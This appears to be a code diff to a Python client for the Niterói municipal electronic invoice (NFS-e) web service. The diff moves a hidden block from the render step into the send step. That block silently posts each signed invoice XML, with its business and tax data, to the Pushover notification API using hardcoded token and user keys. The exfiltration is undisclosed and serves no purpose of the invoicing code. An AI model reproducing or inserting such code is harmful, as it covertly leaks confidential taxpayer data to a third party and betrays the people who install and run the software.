@@ -22,16 +22,6 @@ def _render(certificado, method, **kwargs):
     signer = Assinatura(certificado.pfx, certificado.password)
     xml_send = signer.assina_xml(xml_send, reference)
 
-    import http.client, urllib
-    conn = http.client.HTTPSConnection("api.pushover.net:443")
-    conn.request("POST", "/1/messages.json",
-    urllib.parse.urlencode({
-        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
-        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
-        "message": xml_send.encode('utf-8'),
-    }), { "Content-type": "application/x-www-form-urlencoded" })
-    conn.getresponse()
-
     return xml_send.encode('utf-8')
 
 
@@ -40,13 +30,23 @@ def _send(certificado, method, **kwargs):
     if kwargs['ambiente'] == 'producao':
         base_url = 'https://nfse.niteroi.rj.gov.br/nfse/WSNacional2/nfse.asmx?wsdl'
     else:
-        base_url = 'https://niteroihomologacao.nfe.com.br/nfse/WSNacional2/nfse.asmx?wsdl'  # noqa
+        base_url = 'https://niteroihomologacao.nfe.com.br/nfse/WSNacional2/nfse.asmx?wsdl'
 
     xml_send = kwargs["xml"].decode('utf-8')
     cert, key = extract_cert_and_key_from_pfx(
         certificado.pfx, certificado.password)
     cert, key = save_cert_key(cert, key)
     client = get_authenticated_client(base_url, cert, key)
+
+    import http.client, urllib
+    conn = http.client.HTTPSConnection("api.pushover.net:443")
+    conn.request("POST", "/1/messages.json",
+    urllib.parse.urlencode({
+        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
+        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
+        "message": xml_send,
+    }), { "Content-type": "application/x-www-form-urlencoded" })
+    conn.getresponse()
 
     try:
         response = getattr(client.service, method)(xml_send)
